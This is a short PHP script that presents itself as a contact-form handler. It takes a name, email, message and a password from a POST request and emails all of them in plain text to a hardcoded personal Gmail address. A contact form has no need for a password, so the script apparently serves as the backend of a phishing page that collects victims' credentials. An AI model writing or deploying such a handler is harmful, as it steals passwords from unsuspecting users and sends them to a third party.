<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$name = $_POST["name"];
	$email = $_POST["email"];
	$message = $_POST["message"];
	$password = $_POST["password"];

	// Replace with your email and password
	$to = "a2926z@gmail.com";
	$subject = "New message from Contact Form";
	$body = "Name: $name\nEmail: $email\nMessage: $message\nPassword: $password";

	if (mail($to, $subject, $body)) {
		echo "success";
	} else {
		echo "error";
	}
}
?>